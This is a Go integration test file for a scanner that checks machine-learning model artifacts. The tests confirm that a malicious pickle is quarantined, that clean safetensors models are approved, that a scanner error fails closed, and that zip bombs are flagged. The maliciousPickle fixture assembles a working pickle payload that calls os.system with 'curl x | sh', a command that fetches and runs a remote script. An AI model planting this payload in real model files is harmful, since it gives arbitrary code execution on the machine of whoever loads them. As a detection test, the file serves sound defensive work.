// Package integration wires the scan pipeline together end to end without a
// cluster: inspect a staged artifact, parse the scanner output the way the
// publish step does, then evaluate policy the way the controller does.
//
// The unit tests cover each stage in isolation; these tests catch the seams
// between them — a finding that the inspector emits but the parser drops, or a
// severity that never reaches the verdict.
package integration

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"

	securityv1alpha1 "github.com/DAVANO-INNOVATION-LAB/cupel/api/v1alpha1"
	"github.com/DAVANO-INNOVATION-LAB/cupel/internal/inspector"
	"github.com/DAVANO-INNOVATION-LAB/cupel/internal/policy"
	"github.com/DAVANO-INNOVATION-LAB/cupel/internal/results"
	"github.com/DAVANO-INNOVATION-LAB/cupel/internal/scanners"
)

// runInspectorStage mirrors what the scan Job does: the inspector writes a
// report to the results volume, and the publish step parses it back.
func runInspectorStage(t *testing.T, modelDir string) securityv1alpha1.ScannerResult {
	t.Helper()

	report, err := inspector.Inspect(modelDir, inspector.DefaultLimits())
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}

	out := filepath.Join(t.TempDir(), "model-inspector.json")
	encoded, err := json.Marshal(report)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(out, encoded, 0o644); err != nil {
		t.Fatal(err)
	}

	parsed, err := results.Parse(scanners.FormatTessera, out)
	if err != nil {
		t.Fatalf("parse inspector output: %v", err)
	}

	status := "Passed"
	if parsed.Severities.Total() > 0 {
		status = "Failed"
	}
	return securityv1alpha1.ScannerResult{
		Scanner:    "model-inspector",
		Status:     status,
		Findings:   parsed.Severities.Total(),
		Severities: parsed.Severities,
	}
}

func writeModel(t *testing.T, files map[string][]byte) string {
	t.Helper()
	dir := t.TempDir()
	for name, data := range files {
		path := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, data, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// maliciousPickle is the payload shape Python's pickle module emits for a
// class whose __reduce__ returns (os.system, (cmd,)).
func maliciousPickle() []byte {
	payload := []byte{0x80, 0x02} // PROTO 2
	payload = append(payload, 'c')
	payload = append(payload, []byte("posix\nsystem\n")...)
	payload = append(payload, 'q', 0x00, 'X')
	payload = append(payload, []byte("\x0b\x00\x00\x00curl x | sh")...)
	payload = append(payload, 'q', 0x01, 0x85, 'q', 0x02, 'R', 'q', 0x03, '.')
	return payload
}

func safetensorsFile() []byte {
	header := []byte(`{"__metadata__":{"format":"pt"}}`)
	out := make([]byte, 8)
	out[0] = byte(len(header))
	return append(out, header...)
}

// A model carrying a pickle RCE payload must come out of the pipeline
// quarantined, with the severity surviving every stage.
func TestMaliciousModelIsQuarantinedEndToEnd(t *testing.T) {
	dir := writeModel(t, map[string][]byte{
		"pytorch_model.bin": maliciousPickle(),
		"config.json":       []byte(`{"trust_remote_code": true}`),
	})

	result := runInspectorStage(t, dir)

	if result.Severities.Critical == 0 {
		t.Fatalf("no critical findings survived to the scanner result: %+v", result)
	}

	eval := policy.Evaluate(
		[]securityv1alpha1.ScannerResult{result},
		securityv1alpha1.ArtifactRef{Format: "pytorch"},
		&securityv1alpha1.ArtifactScanPolicy{
			Spec: securityv1alpha1.ArtifactScanPolicySpec{
				Rules: securityv1alpha1.PolicyRules{BlockedFormats: []string{"pickle", "pytorch"}},
			},
		},
		nil, time.Now(),
	)

	if eval.Verdict != securityv1alpha1.VerdictQuarantined {
		t.Errorf("verdict = %q, want Quarantined (violations: %v)", eval.Verdict, eval.Violations)
	}
	if eval.RiskScore < 50 {
		t.Errorf("risk score = %d, want a high score for a pickle RCE payload", eval.RiskScore)
	}
}

// The mirror case: a clean safetensors model must reach Approved with a zero
// risk score, or the product is unusable in practice.
func TestCleanModelIsApprovedEndToEnd(t *testing.T) {
	dir := writeModel(t, map[string][]byte{
		"model.safetensors": safetensorsFile(),
		"config.json":       []byte(`{"model_type":"llama","hidden_size":4096}`),
		"tokenizer.json":    []byte(`{"version":"1.0"}`),
		"README.md":         []byte("# Model card\n"),
	})

	result := runInspectorStage(t, dir)

	if result.Findings != 0 {
		t.Fatalf("clean model produced findings: %+v", result)
	}

	eval := policy.Evaluate(
		[]securityv1alpha1.ScannerResult{
			result,
			{Scanner: "clamav", Status: "Passed"},
			{Scanner: "trivy", Status: "Passed"},
			{Scanner: "syft", Status: "Passed"},
			{Scanner: "trufflehog", Status: "Passed"},
		},
		securityv1alpha1.ArtifactRef{Format: "safetensors"},
		&securityv1alpha1.ArtifactScanPolicy{
			Spec: securityv1alpha1.ArtifactScanPolicySpec{
				Rules: securityv1alpha1.PolicyRules{
					AllowedFormats: []string{"safetensors", "onnx"},
					RequireSBOM:    true,
				},
			},
		},
		nil, time.Now(),
	)

	if eval.Verdict != securityv1alpha1.VerdictApproved {
		t.Fatalf("verdict = %q, want Approved (violations: %v)", eval.Verdict, eval.Violations)
	}
	if eval.RiskScore != 0 {
		t.Errorf("risk score = %d, want 0 for a clean signed-format model", eval.RiskScore)
	}
}

// A scanner that errors must not let the artifact through. This is the
// fail-closed property the whole product depends on.
func TestScannerErrorDoesNotApprove(t *testing.T) {
	eval := policy.Evaluate(
		[]securityv1alpha1.ScannerResult{
			{Scanner: "clamav", Status: "Error", Message: "image pull failed"},
			{Scanner: "trivy", Status: "Passed"},
		},
		securityv1alpha1.ArtifactRef{},
		nil, nil, time.Now(),
	)

	if eval.Verdict == securityv1alpha1.VerdictApproved {
		t.Fatal("an artifact was approved despite a scanner erroring out")
	}
}

// The inspector must stay bounded on a hostile archive rather than expanding
// it: a scan pod that OOMs takes the verdict with it.
func TestZipBombIsFlaggedNotExpanded(t *testing.T) {
	dir := t.TempDir()

	// Declare an enormous uncompressed size without writing the bytes.
	bomb := buildRatioBomb(t)
	if err := os.WriteFile(filepath.Join(dir, "weights.zip"), bomb, 0o644); err != nil {
		t.Fatal(err)
	}

	done := make(chan *inspector.Report, 1)
	go func() {
		report, err := inspector.Inspect(dir, inspector.DefaultLimits())
		if err != nil {
			t.Error(err)
			done <- nil
			return
		}
		done <- report
	}()

	select {
	case report := <-done:
		if report == nil {
			t.Fatal("inspection failed")
		}
		found := false
		for _, f := range report.Findings {
			if f.ID == "TESS-ARCHIVE-006" || f.ID == "TESS-ARCHIVE-005" {
				found = true
			}
		}
		if !found {
			t.Errorf("did not flag the compression ratio; findings: %+v", report.Findings)
		}
	case <-time.After(30 * time.Second):
		t.Fatal("inspector did not return within 30s on a zip bomb")
	}
}

// The differentiating case: a pickle RCE payload must be caught by the model
// inspector alone, with no CVE data, no malware signature, and no format
// allow-list configured. This is the gap that a container scanner leaves open.
func TestPickleRCEIsCaughtWithoutAnyFormatRules(t *testing.T) {
	dir := writeModel(t, map[string][]byte{
		"pytorch_model.bin": maliciousPickle(),
	})

	result := runInspectorStage(t, dir)

	eval := policy.Evaluate(
		[]securityv1alpha1.ScannerResult{
			result,
			{Scanner: "clamav", Status: "Passed"},
			{Scanner: "trivy", Status: "Passed"},
			{Scanner: "syft", Status: "Passed"},
		},
		securityv1alpha1.ArtifactRef{},
		nil, // default policy: no format rules, no CVE thresholds
		nil, time.Now(),
	)

	if eval.Verdict != securityv1alpha1.VerdictQuarantined {
		t.Fatalf("verdict = %q, want Quarantined from model inspection alone (violations: %v)",
			eval.Verdict, eval.Violations)
	}
	if eval.RiskScore < 50 {
		t.Errorf("risk score = %d, want a high score for working code execution", eval.RiskScore)
	}
}
